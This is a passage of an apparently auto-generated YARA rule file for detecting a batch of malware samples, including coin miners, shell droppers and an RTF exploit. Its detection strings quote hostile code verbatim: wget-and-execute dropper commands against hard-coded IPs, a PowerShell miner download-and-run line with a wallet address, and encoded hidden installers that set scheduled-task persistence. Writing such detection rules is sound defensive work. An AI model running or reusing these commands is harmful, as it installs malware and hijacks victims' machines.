      $s2 = "pyobfuscate({getattr(__import__(Il),lIl)(lI,'',\"https://pyobfuscate.com\"):\"IllIlIIIIlIlIIllIllIlIlIlIIllllIlII\",'pyc':\"\"\"" ascii /* score: '21.00'*/
      $s3 = "b6a66491a704bcecef12ad22671ed52e98d3ee169bb453940438af8f48f31abc94983068ebc22a45846818654d563a6c18dbbc121a4414db43ccd2613955d029" ascii /* score: '11.00'*/
      $s4 = "84b7be7a1131f0f82c2aeaa86f2338910a7d7b09ad9aa39c72044ab3b95111bbbf29d59adbd735ea0447b947572170d44859e83ce25b486d3365f7d9eeb5196e" ascii /* score: '11.00'*/
      $s5 = "6d46de786e0268d3718a43a5e8dc50cb3c2b60122887bbbfbb2c9545c0c0aaad40201c8a4d35f7c5d866fa4c27268f972ccc06a24953ae885920db821482a79e" ascii /* score: '11.00'*/
      $s6 = "6af0402670720c37b2cecd3f5e1e3eeac463be3159d6d47ec66a82086784c5760a5c49042666cd483899a4cdad78552bf6171e741aae1b0a73b0dea6eb934a02" ascii /* score: '11.00'*/
      $s7 = "2eaffb10dc4ee7f5957ea0e73eae90d892c36553c6880160cbfe2e83dadf3a037c4f29286d719baa6b411c09c20573e6df8635ea080a959791953260614c2da0" ascii /* score: '11.00'*/
      $s8 = "8c6e8249b9de8347c52a234e1a190c158f9f8f320c1fad55433ef78cc3961966457d859526958cd6839622b0be6e3f547036ba7dbfad5dde7f58cb7e54c15fb3" ascii /* score: '11.00'*/
      $s9 = "010d34a5b86ced74f375b01470e9f6f273652f51efd9fbbb9a2a2725a0839ab42c9283c2a5b82c1a22cd106773a27c43614a40856551d546c72dd15c5ef7e68a" ascii /* score: '11.00'*/
      $s10 = "2c41f79fa3a5ec705141928ddc9aac25afadad44bed6d86816d88299d66e422dac099e2dd9214295c82daf23e921ebd97178bd2fbc3fa279fdea7d5cf3b4190e" ascii /* score: '11.00'*/
      $s11 = "bb339d1bfa13625a6c2b2a86aa3e396802eafe3b9b2154694f0fa273fb2131fe44c2ccce1ad293fe469012ffbbb440b078a765357a661b2c56daaae057124081" ascii /* score: '11.00'*/
      $s12 = "6b29281b4df4158d94aa755f76434da2b964f3b6c8e3f05080233a90867148acfa2b8f23c1b2c016dc585a10ebcbc1481335a48162aa8d8e5bc2b8bceece1539" ascii /* score: '11.00'*/
      $s13 = "72bd43a9603d50022609776bf0b0c253d0295d818775143bc74f39409b289c53b8d62c735082653f5bbf5f534d99ce90b374e032ded3f5df8acba221d20c7136" ascii /* score: '11.00'*/
      $s14 = "f4502f2e91b027ff6c2f0fed612392174ed3c4ccc4a842fe39b37423bc6f46c526dc3461232e6a35b20bf49bd55e2900933620a79bed55e581d3f12fccfbffdc" ascii /* score: '11.00'*/
      $s15 = "16003c2c11a15d7dcd64a92c3b208392aa9c460eb1908dd1b6ab33c72565c3fb604696386ee90d5706e9acef33aae40bb4ae16fa5af2bf815e0e0fd273c84061" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x7970 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule c01b98c293313d1f3b50ee7bc143e48b04fe2b9f69d00c83ce3b7a9c23cd7f33_c01b98c2 {
   meta:
      description = "_subset_batch - file c01b98c293313d1f3b50ee7bc143e48b04fe2b9f69d00c83ce3b7a9c23cd7f33_c01b98c2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c01b98c293313d1f3b50ee7bc143e48b04fe2b9f69d00c83ce3b7a9c23cd7f33"
   strings:
      $s1 = "    wget http://$server_ip/$binname.$arch -O $execname" fullword ascii /* score: '22.00'*/
      $s2 = "execname=\"ssh.twix\"" fullword ascii /* score: '12.00'*/
      $s3 = "    rm -rf $execname" fullword ascii /* score: '11.00'*/
      $s4 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule dc33d4fa197544f031a491628aab4fdadc2ba1246bd454a5919a5583b9c0b1ba_dc33d4fa {
   meta:
      description = "_subset_batch - file dc33d4fa197544f031a491628aab4fdadc2ba1246bd454a5919a5583b9c0b1ba_dc33d4fa.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc33d4fa197544f031a491628aab4fdadc2ba1246bd454a5919a5583b9c0b1ba"
   strings:
      $s1 = "cd /tmp ; wget http://85.192.48.47/amd64 ; chmod 777 amd64 ; ./amd64 ; rm -rf amd64" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp ; wget http://85.192.48.47/mipsel ; chmod 777 mipsel ; ./mipsel ; rm -rf mipsel" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule cd0d1ccefe9e6004f3b072c2c6dd61c8b6a1c681ea59677f9329b57e9bba000b_cd0d1cce {
   meta:
      description = "_subset_batch - file cd0d1ccefe9e6004f3b072c2c6dd61c8b6a1c681ea59677f9329b57e9bba000b_cd0d1cce.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd0d1ccefe9e6004f3b072c2c6dd61c8b6a1c681ea59677f9329b57e9bba000b"
   strings:
      $s1 = "FFFFFG" fullword ascii /* reversed goodware string 'GFFFFF' */ /* score: '13.50'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 500KB and
      all of them
}

rule d6db447fd1b519ae79892b4ce1c770b127bc7a591eff74f461b337e58fe666b4_d6db447f {
   meta:
      description = "_subset_batch - file d6db447fd1b519ae79892b4ce1c770b127bc7a591eff74f461b337e58fe666b4_d6db447f.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d6db447fd1b519ae79892b4ce1c770b127bc7a591eff74f461b337e58fe666b4"
   strings:
      $s1 = "- o7lDBg|\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 700KB and
      all of them
}

rule c41a5c83bd99843db74135478741fa726408dff08e97a49dae74f5c411afbc2b_c41a5c83 {
   meta:
      description = "_subset_batch - file c41a5c83bd99843db74135478741fa726408dff08e97a49dae74f5c411afbc2b_c41a5c83.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c41a5c83bd99843db74135478741fa726408dff08e97a49dae74f5c411afbc2b"
   strings:
      $s1 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule DarkCloud_signature__4b554814 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_4b554814.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4b55481443cfa1dec6972320d4b1c7539a4a10f5966695452f75ee4499eb89cc"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "VzBz!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule c843a78b214287d5d596c8ff803dcc151ef3752058209890ff0683366b068ff2_c843a78b {
   meta:
      description = "_subset_batch - file c843a78b214287d5d596c8ff803dcc151ef3752058209890ff0683366b068ff2_c843a78b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c843a78b214287d5d596c8ff803dcc151ef3752058209890ff0683366b068ff2"
   strings:
      $s1 = "65595559677c" ascii /* score: '17.00'*/ /* hex encoded string 'eYUYg|' */
      $s2 = "Tv_!!!" fullword ascii /* score: '10.00'*/
      $s3 = "immuoii" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 100KB and
      all of them
}

rule c9cdf5f20b8a628bc82a50073b6fb9d679538ea2e71f51bcf832ad05f45c078c_c9cdf5f2 {
   meta:
      description = "_subset_batch - file c9cdf5f20b8a628bc82a50073b6fb9d679538ea2e71f51bcf832ad05f45c078c_c9cdf5f2.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c9cdf5f20b8a628bc82a50073b6fb9d679538ea2e71f51bcf832ad05f45c078c"
   strings:
      $s1 = "+_)\\{$5f" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s2 = "rbaiemckg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule cb283b9b9a95d17298e0e996ecf5006629a70e926d406280540691f33e7ea7e8_cb283b9b {
   meta:
      description = "_subset_batch - file cb283b9b9a95d17298e0e996ecf5006629a70e926d406280540691f33e7ea7e8_cb283b9b.rtf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cb283b9b9a95d17298e0e996ecf5006629a70e926d406280540691f33e7ea7e8"
   strings:
      $s1 = "004551756154696f6e2e33" ascii /* score: '17.00'*/ /* hex encoded string 'EQuaTion.3' */
      $s2 = "4551756154696f6e2e33" ascii /* score: '17.00'*/ /* hex encoded string 'EQuaTion.3' */
      $s3 = "000081eb6d2800002d0a4600005b589debce9c52508d804f2200008d825345000081ea8a09000090585aeb05874becdce39deb07ebaae974ffffff83c204eb36" ascii /* score: '11.00'*/
      $s4 = "a4e3916ae9ebea5f394c017660bab1531a53eb9956d9f0357eee9995a75a91eadf4c95696991bd90f8dfac5af80dde8bc559e2eaeea39d7e7bad87d92462e74a" ascii /* score: '11.00'*/
      $s5 = "204602c517b8968ab375bf3cc01436121f93b89029484b40a238492c790281feed7f99e30e9265df2d3379e7eeddf124076306a532aae78d35992c8591c0b906" ascii /* score: '11.00'*/
      $s6 = "94b7aef8e870f1c85eb6c9b442c693dad237be667b4c0ebd2727d8cf6e14494eddbd9ff3347170b5aa66df1226f5eb4f87d8a1b0df7167c1b104308f38f7cbec" ascii /* score: '11.00'*/
      $s7 = "ff95b5193a885979c38939b6c9c7a51fcf2c2b35fed6946b47f55822606892eccc60103861675ee214ef084ea032257e71e6822abeaf9a18f9c87992b1ab4ab4" ascii /* score: '11.00'*/
      $s8 = "7bb75a44b5a8f1e31ec30b97c200c3459bbd45d1dcfb1a652b9b54b2e0a6e227498bc23ee75746aeb00057b54b9eb15857ae209ba54fc9c87c8463b1d2787be3" ascii /* score: '11.00'*/
      $s9 = "39eae985000000e948ffffffeb0a8daaad020000eb19eb1ceb0f905159525ae937ffffffe977ffffffeba5ebd3eb5d6bc900eb15ebe2ebc8ebd4ebf3ebc290eb" ascii /* score: '11.00'*/
      $s10 = "a5ff7ce8d8254fe4dc860813e0b515f3071076d18717eb25ed57ecfb7b285154c0d12a38122bc7531281b8710feacd78b6c816efef0ee372a4eac4d58d6589e1" ascii /* score: '11.00'*/
      $s11 = "990e2029b7a0e410d6ec7b1ffcebfe342cf99f399315df57d626d93e5134735c4ea9b02a5297e0644ef0ef44efcf94d0d0b1a00bc3b237420ed90f44a94fb49f" ascii /* score: '11.00'*/
      $s12 = "6d430243dd8c0f0f711445d7dd99856d754e5b279e88abd2cfdd21790ac4130a135f6729d7ae8532924212b4d15ce7780deabc549f11c9bde112a0be8437994f" ascii /* score: '11.00'*/
      $s13 = "060b201eebdf6aebcf69c965808362e91bffffff9c565281c67d04000081ea800100008d96ef660000905a5e9d310ae9e2feffffeb0a8e296ff85c39e38367e8" ascii /* score: '11.00'*/
      $s14 = "e7264276f4af3f6f03b810f1c90e55881709aed95cc6a926153fd1196f87af5f6153a55b2bb4b7a416383a8de08b4afdcde127b81d9d9545a25c23743f342f5c" ascii /* score: '11.00'*/
      $s15 = "561c1b95b784484252b3e200f460c47358a9e240704e7a54a2f26519075c50c4abbcf88ccfe272ea2a7f64db256b4a231ce6b288a0cf8015b9e92b561d1efe9d" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5c7b and filesize < 9KB and
      8 of them
}

rule cd2d41ead93a3ac17696a2ae950b6e24f1c71de6f17db08069158c72aebd5c47_cd2d41ea {
   meta:
      description = "_subset_batch - file cd2d41ead93a3ac17696a2ae950b6e24f1c71de6f17db08069158c72aebd5c47_cd2d41ea.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd2d41ead93a3ac17696a2ae950b6e24f1c71de6f17db08069158c72aebd5c47"
   strings:
      $s1 = "Set tremendous = sigavulcanaliaus.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '22.00'*/
      $s2 = "cyanoformate = drawhead.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s3 = "Set certhidea = sigavulcanaliaus.Get(\"Win32_Process\")" fullword ascii /* score: '19.00'*/
      $s4 = "Set drawhead = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '15.00'*/
      $s5 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s6 = "Set sigavulcanaliaus = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule cd8334eb73a9a2eff74d5ced509f1c1ddf11814e1d3963bdd2fce7c19bf898ac_cd8334eb {
   meta:
      description = "_subset_batch - file cd8334eb73a9a2eff74d5ced509f1c1ddf11814e1d3963bdd2fce7c19bf898ac_cd8334eb.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd8334eb73a9a2eff74d5ced509f1c1ddf11814e1d3963bdd2fce7c19bf898ac"
   strings:
      $s1 = "pe.txt" fullword ascii /* score: '8.00'*/
      $s2 = "Skype.ps1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule CoinMiner_signature__4 {
   meta:
      description = "_subset_batch - file CoinMiner(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f74179173eb09e39d0aeb352a3239c2bb9bee68acf389e70b5801372eb569135"
   strings:
      $x1 = "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('h" ascii /* score: '47.00'*/
      $x2 = "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('h" ascii /* score: '32.00'*/
      $s3 = "ttps://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 434HwDU1ga" ascii /* score: '26.00'*/
      $s4 = "n4XfYjySu5mrBvLQ8KK4YoyS6CkmRkMwJWR5zSu7pFTHXCYYANtTqJzeCJLWrEgM7xuDvkRS9Gp4vCGkwN3XM; Remove-Item -Force $tempfile" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7724 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature__5 {
   meta:
      description = "_subset_batch - file CoinMiner(signature).unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dff128239bfe571e7013b45d7cc6fec69e68e6aaf7acd247faa992158450d0a2"
   strings:
      $s1 = "lAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHgAbQByAGkAZwBVAHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAeABtAHIAaQBnAFoAaQBwACAALQBVAHMAZQB" ascii /* base64 encoded string ' b R e q u e s t   - U r i   $ x m r i g U r l   - O u t F i l e   $ x m r i g Z i p   - U s e ' */ /* score: '22.00'*/
      $s2 = "lAC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACgASgBvAGkAbgAtAFAAYQB0AGgAIAAkAG0AaQBuAGUAcgBEAGkAcgAgACIAUwB5AHMAdABlAG0AUwBlAHIAdgBpAGMAZQB" ascii /* base64 encoded string ' - I t e m   - P a t h   ( J o i n - P a t h   $ m i n e r D i r   " S y s t e m S e r v i c e ' */ /* score: '21.00'*/
      $s3 = "powershell -w h -enc IwBSAGUAcQB1AGkAcgBlAHMAIAAtAFIAdQBuAEEAcwBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA0ACgANAAoAJABtAGkAbgBlAHIARAB" ascii /* score: '18.00'*/
      $s4 = "gACQAYwBvAG4AZgBpAGcARgBpAGwAZQAgAC0AVgBhAGwAdQBlACAAJABjAG8AbgBmAGkAZwBKAHMAbwBuACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdAB" ascii /* base64 encoded string ' $ c o n f i g F i l e   - V a l u e   $ c o n f i g J s o n   - F o r c e   - E r r o r A c t ' */ /* score: '17.00'*/
      $s5 = "hAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAYAAiACQAbQBpAG4AZQByAFQAYQBzAGsATgBhAG0AZQBgACIAIAAvAHMAYwAgAG8AbgBsAG8AZwBvAG4AIAA" ascii /* base64 encoded string ' s k s   / c r e a t e   / t n   ` " $ m i n e r T a s k N a m e ` "   / s c   o n l o g o n   ' */ /* score: '17.00'*/
      $s6 = "yAFQAYQBzAGsARQB4AGkAcwB0AHMAIAA9ACAAcwBjAGgAdABhAHMAawBzACAALwBxAHUAZQByAHkAIAAvAHQAbgAgACQAbQBpAG4AZQByAFQAYQBzAGsATgBhAG0AZQA" ascii /* base64 encoded string ' T a s k E x i s t s   =   s c h t a s k s   / q u e r y   / t n   $ m i n e r T a s k N a m e ' */ /* score: '17.00'*/
      $s7 = "gACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB4AG0AcgBpAGcALwB4AG0AcgBpAGcALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwB" ascii /* base64 encoded string ' " h t t p s : / / g i t h u b . c o m / x m r i g / x m r i g / r e l e a s e s / d o w n l o ' */ /* score: '17.00'*/
      $s8 = "gACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBlAG4AYQBtAGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJAB4AG0AcgBpAGcARABpAHIAIAAtAE4AZQB3AE4AYQB" ascii /* base64 encoded string '                           R e n a m e - I t e m   - P a t h   $ x m r i g D i r   - N e w N a ' */ /* score: '17.00'*/
      $s9 = "gACAAIAAgACAAIAAkAHgAbQByAGkAZwBEAGkAcgAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAbQBpAG4AZQByAEQAaQByACAAIgB4AG0AcgBpAGcALQA2AC4AMgA" ascii /* base64 encoded string '           $ x m r i g D i r   =   J o i n - P a t h   $ m i n e r D i r   " x m r i g - 6 . 2 ' */ /* score: '17.00'*/
      $s10 = "lACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQAtAGMAbwBuAGYAaQBnAD0AYAAiACQAYwBvAG4AZgBpAGcARgBpAGwAZQBgACIAIgAgAC0AVwBpAG4AZAB" ascii /* base64 encoded string '   - A r g u m e n t L i s t   " - - c o n f i g = ` " $ c o n f i g F i l e ` " "   - W i n d ' */ /* score: '17.00'*/
      $s11 = "GAE0ASgBQADQAWABOAHYAWABQAE0ATABlAHAAaABrAGQARgA2AHkAZQBiAHQAawBKAGQAagBhADEAVQBmAG4AVQBLAHoAMgBlAGEATQBxAHAATgBHADIAagA4ADEAcAA" ascii /* base64 encoded string ' M J P 4 X N v X P M L e p h k d F 6 y e b t k J d j a 1 U f n U K z 2 e a M q p N G 2 j 8 1 p ' */ /* score: '17.00'*/
      $s12 = "HAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAHMAZQByAHYAaQBjAGUAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB" ascii /* base64 encoded string ' e t - P r o c e s s   - N a m e   " s e r v i c e "   - E r r o r A c t i o n   S i l e n t l ' */ /* score: '17.00'*/
      $s13 = "0AGUAbQAgAC0AUABhAHQAaAAgACQAeABtAHIAaQBnAFoAaQBwACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQB" ascii /* base64 encoded string ' e m   - P a t h   $ x m r i g Z i p   - F o r c e   - E r r o r A c t i o n   S i l e n t l y ' */ /* score: '17.00'*/
      $s14 = "powershell -w h -enc IwBSAGUAcQB1AGkAcgBlAHMAIAAtAFIAdQBuAEEAcwBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA0ACgANAAoAJABtAGkAbgBlAHIARAB" ascii /* score: '17.00'*/
      $s15 = "lACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABtAGkAbgBlAHIARABpAHIAIAAiAFMAeQBzAHQAZQBtAFMAZQByAHYAaQBjAGUAXABzAGUAcgB2AGkAYwBlAC4AZQB" ascii /* base64 encoded string '   =   J o i n - P a t h   $ m i n e r D i r   " S y s t e m S e r v i c e \ s e r v i c e . e ' */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 30KB and
      8 of them
}

rule d11a6652bff6e81b9098f1c24b4b27578970ed3abe6d2b5fa7133bbad01ff12a_d11a6652 {
   meta:
      description = "_subset_batch - file d11a6652bff6e81b9098f1c24b4b27578970ed3abe6d2b5fa7133bbad01ff12a_d11a6652.wsf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d11a6652bff6e81b9098f1c24b4b27578970ed3abe6d2b5fa7133bbad01ff12a"
   strings:
      $x1 = "CommonParams.setAll({common_query:\"lang=en\",opendb_url:\"index.php?route=/database/structure&lang=en\",lang:\"en\",server:\"1" ascii /* score: '35.00'*/
      $s2 = "0\",session_gc_maxlifetime:\"1440\",logged_in:false,is_https:true,rootPath:\"/\",arg_separator:\"&\",version:\"5.2.1\",auth_type" ascii /* score: '24.00'*/
      $s3 = "\"\",db:\"\",token:\"61537757567364273147273c79234d5a\",text_dir:\"ltr\",LimitChars:\"50\",pftext:\"\",confirm:true,LoginCookieV" ascii /* score: '23.00'*/
      $s4 = "var mysqlDocTemplate = '.\\/url.php\\u003Furl\\u003Dhttps\\u00253A\\u00252F\\u00252Fdev.mysql.com\\u00252Fdoc\\u00252Frefman\\u0" ascii /* score: '21.00'*/
      $s5 = "var mysqlDocTemplate = '.\\/url.php\\u003Furl\\u003Dhttps\\u00253A\\u00252F\\u00252Fdev.mysql.com\\u00252Fdoc\\u00252Frefman\\u0" ascii /* score: '21.00'*/
      $s6 = "<a href=\"./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F\" target=\"_blank\" rel=\"noopener noreferrer\" class=\"logo\">" fullword ascii /* score: '21.00'*/
      $s7 = "CommonParams.setAll({common_query:\"lang=en\",opendb_url:\"index.php?route=/database/structure&lang=en\",lang:\"en\",server:\"1" ascii /* score: '19.00'*/
      $s8 = "61537757567364273147273c79234d5a" ascii /* score: '19.00'*/ /* hex encoded string 'aSwWVsd'1G'<y#MZ' */
      $s9 = "<form method=\"post\" id=\"login_form\" action=\"index.php?route=/\" name=\"login_form\" class=\"disableAjax hide js-show\">" fullword ascii /* score: '19.00'*/
      $s10 = "ConsoleEnterExecutes=false" fullword ascii /* score: '18.00'*/
      $s11 = "      Log in      <a href=\"./doc/html/index.html\" target=\"documentation\"><img src=\"themes/dot.gif\" title=\"Documentation\"" ascii /* score: '17.00'*/
      $s12 = "AJAX.scriptHandler" fullword ascii /* score: '17.00'*/
      $s13 = ",user:\"root\"});" fullword ascii /* score: '16.00'*/
      $s14 = "  <script data-cfasync=\"false\" type=\"text/javascript\" src=\"js/dist/error_report.js?v=5.2.1\"></script>" fullword ascii /* score: '16.00'*/
      $s15 = "  <script data-cfasync=\"false\" type=\"text/javascript\" src=\"js/dist/drag_drop_import.js?v=5.2.1\"></script>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__4a9c99e5 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_4a9c99e5.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4a9c99e56f73272d09483b2598b0578808b6bd59e03a5c8ec5b6f7f0bed4513e"
   strings:
      $x1 = "$mifnifutxbbgcfqihhhyfbyhc='KT4hNoxkZGRkPSznjW0s76UsYWRUO2SbtKdkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRk5GRkZGp73mpk0G2pRdxl" ascii /* score: '68.00'*/
      $x2 = "$omlwlwsvbjvyxqfvquvnoiuqn='MiXvf3x/f397f39/gIB/f8d/f39/f39/P39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/X35/f3FgxXF/y3ayXsd+" ascii /* score: '50.00'*/
      $s3 = "tChXiylXsCFXoSyli0Slo2YhV74tR6MtG6WIRChXnSWloGYt764pV5ospY1EIFeFJaWmaqWlaiFXtyVXqCXvviDvtS3vqSyljURXnSWloWohV4ylpWpXqyHvqe+1paNu" ascii /* score: '26.00'*/
      $s4 = "InQsT58la3UiRCVrdSJULO+7LKWPYizhvxB/KO+nLe+zLO+pjCvmZE0spYdiLe+QKGefLE+fLOGbEHQo76PtWi3vsy3vqox5V3VkLO84QCTcZeZkfizvCEAsLO8QQDQs" ascii /* score: '26.00'*/
      $s5 = "OEA0LOegRCU6OzqnjJ01mpvsqEMs7ThAfCztEEBELO0wQHQzLOeIRCzvlizvvSzvHWwsT10spZthLNzim0ljLF+0EwMs76ospYVhjGQ0mZss7SBAVCjvL2ws728s77Qt" ascii /* score: '25.00'*/
      $s6 = "ZhHMLO+n22XmZEospYxsLOGkEGgsm6MspYxsLOGkEZAo76Ms77ct76qM8J2bm+GkEEws558ba+IL5ptsLGvei2Ml3GXmZHQs77Mt76qMFJ2bm+Gka+E15ptgV6SNC+ab" ascii /* score: '25.00'*/
      $s7 = "LOGta+Cq5mRULO0wQFQp76ks7ShATCjvoi3vq+0YQEQt77KMS56bmy3vqCDvlIxQo2FkIeGSa+Dy5mRjkid8ZWvg6OZkGyzvL0Qs6R9MLOGtEGws72MsXWISPyjvYijp" ascii /* score: '25.00'*/
      $s8 = "syjvp4yokm1kJdxl5mR0Le+yLO+pjF/Sm5trM6SjYudkOCVrdWIoZ58la3UidCxPnyVrdSJEJWt1IlQs77sspY9iLOG/EH8o76ct77Ms76mMm9Gbmyylh2It75AoZ58s" ascii /* score: '25.00'*/
      $s9 = "LO+9LOelVIzqBY2bLOkvfCznoEQ/jXSUjZss7ThAdDMs54hELO99LO+dLOG/a+Ds5mRXLO0QQFQs7xVsLF+6EHos6S9UjDQFjZss6S98jLOLjZss56c0LF+6EYEs73ss" ascii /* score: '25.00'*/
      $s10 = "jO/mZGFrM6SjYudkVCVrdWIoZ58la3UidCxPnyVrdSJEJWt1IlQs77sspY9iLOG/EH8o76ct77Ms76mMK+ZkTSylh2It75AoZ58sT58s4ZsQdCjvo+1aLe+zLe+qjEmT" ascii /* score: '25.00'*/
      $s11 = "a3QrdGt1L3RdYxC9LAcrcCzpcTC8e2QspYVnJdwg5mRZjIlAZGQs7SdsLOGkEEUoB2Ms76ws7zNsLaWEZ4yVfn9kLO+nLO84QFQs56BEO6eM2pybmyjpYUO8e2TeL+Zk" ascii /* score: '25.00'*/
      $s12 = "442bLO+cLOGkECUt77Ms76ybMEAE4aQQVy3vaizvsoy9BmRkLO+ULOGkEEQs77Ms76zhiRBjjAYEZWSPYYxfBGVkLO+q77yMVVeNmyzvq4ztEo2bLO8YQCTvp49mV6Qs" ascii /* score: '25.00'*/
      $s13 = "LOeIRCHvVFeJKe+NKe+ELO+d75Eg75npMU2ML81kZCztIEAULO+8LOGkEVxd0EDk5mRAEH7pKWaMeWZlZCzpcUbma2Qo76Ms76yMo0Gmm4yKBGVko2Ry5mRl3OebeY0I" ascii /* score: '25.00'*/
      $s14 = "jEhlZWQs7SdMLOGkEGoo76Ms77Es76yMwSNkZCzteeJFLGQs72cs768s7yRsm3F6kmdkLO9hC0UsZCztYfxFLGQk4JIQdSzvZyzvrxIs7yRsm3GfkWdk9CzpKEBUjEye" ascii /* score: '25.00'*/
      $s15 = "7zhABCzvCEAMLOegVCU6OzqnIO1S3WLmZGGMgJ9AZOOoOiztOEB0LO0IQHws7RBARDMlMiUzLOeIRCzvlSzv7RxmZGSMvYpHZOGkGgMs72mq5wlkLOGtEUXddGVkZIwb" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 29000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__590ead64 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_590ead64.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "590ead649185e729564dd34f5227dca7a22d82a9acb2f62063614398c1727af1"
   strings:
      $x1 = "$oqgqrfkyf='obapvgTs7OzstaRvBeWkZy2k6ezcs+wTPC/s7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsbOzs7OLzVuLsWOUhzVTtoCHNuISFn8ycnoOL" ascii /* score: '68.00'*/
      $x2 = "$erjldoxzmbuwrpesdnykbq='d2CqOjk6Ojo+Ojo6xcU6OoI6Ojo6Ojo6ejo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Gjs6OjQlgDQ6jjP3G4I7dvc" ascii /* score: '47.00'*/
